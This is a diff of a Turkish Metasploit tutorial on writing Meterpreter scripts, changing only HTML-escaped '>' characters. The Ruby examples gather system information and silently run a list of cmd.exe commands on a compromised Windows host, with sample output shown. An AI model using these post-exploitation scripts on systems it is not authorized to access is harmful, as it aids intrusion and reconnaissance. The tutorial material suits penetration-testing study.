@@ -26,7 +26,7 @@ Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca 
 
 
 ```bash
-root@kali:~# echo “print_status**(**“Hello World”**)**” **&gt;** /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+root@kali:~# echo “print_status**(**“Hello World”**)**” **>** /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
 ```
 
 
@@ -35,9 +35,9 @@ Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
 
 
 ```bash
-meterpreter **&gt;** run helloworld
+meterpreter **>** run helloworld
 **[*********]** Hello World
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -56,11 +56,11 @@ Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma
 
 
 ```bash
-meterpreter **&gt;** run helloworld
+meterpreter **>** run helloworld
 **[*********]** Hello World
 **[**-] this is an error!
 this is a line
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -87,7 +87,7 @@ print_line("This is a line")
  def geninfo**(**session**)**
     begin
     …..
-    rescue ::Exception **=&gt;** e
+    rescue ::Exception **=>** e
     …..
     end
  end
@@ -107,7 +107,7 @@ Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeter
        print_status**(**"tThe target machine OS is #{sysnfo['OS']}"**)**
        print_status**(**"tThe computer name is #{'Computer'} "**)**
        print_status**(**"tScript running as #{runpriv}"**)**
-    rescue ::Exception **=&gt;** e
+    rescue ::Exception **=>** e
        print_error**(**"The following error was encountered #{e}"**)**
     end
  end
@@ -135,7 +135,7 @@ Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, de�
        print_status**(**"tThe target machine OS is #{sysnfo['OS']}"**)**
        print _status**(**"tThe computer name is #{'Computer'} "**)**
        print_status**(**"tScript running as #{runpriv}"**)**
- rescue ::Exception **=&gt;** e
+ rescue ::Exception **=>** e
        print_error**(**"The following error was encountered #{e}"**)**
     end
  end
@@ -149,7 +149,7 @@ Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, de�
 
 
 ```bash
- meterpreter **&gt;** run helloworld2
+ meterpreter **>** run helloworld2
  **[*********]** Getting system information ...
  **[*********]**     The target machine OS is Windows XP **(**Build 2600, Service Pack 3**)**.
  **[*********]**     The computer name is Computer
@@ -177,12 +177,12 @@ def list_exec**(**session,cmdlst**)**
     cmdlst.each **do** |cmd|
        begin
           print_status "running command #{cmd}"
-          r **=** session.sys.process.execute**(**"cmd.exe /c #{cmd}", nil, **{**'Hidden' **=&gt;** true, 'Channelized' **=&gt;** true**})**
+          r **=** session.sys.process.execute**(**"cmd.exe /c #{cmd}", nil, **{**'Hidden' **=>** true, 'Channelized' **=>** true**})**
           **while****(**d **=** r.channel.read**)**             print_status**(**"t#{d}"**)**
           end
           r.channel.close
           r.close
-       rescue ::Exception **=&gt;** e
+       rescue ::Exception **=>** e
           print_error**(**"Error Running Command #{cmd}: #{e.class} #{e}"**)**
        end
     end
@@ -216,7 +216,7 @@ Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı `list
 
 
 ```bash
- meterpreter **&gt;** run helloworld3
+ meterpreter **>** run helloworld3
  **[*********]** Running Command List ...
  **[*********]**     running command set
  **[*********]**     ALLUSERSPROFILE**=**C:\Documents and Settings\All Users
@@ -269,7 +269,7 @@ Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı `list
  Interface: 172.16.104.145 on Interface 0x1000003
  Internet Address      Physical Address      Type
  172.16.104.2          00-50-56-eb-db-06     dynamic   
- 172.16.104.150        00-0c-29-a7-f1-c5     dynamic    meterpreter **&gt;**
+ 172.16.104.150        00-0c-29-a7-f1-c5     dynamic    meterpreter **>**
 ```
 
 
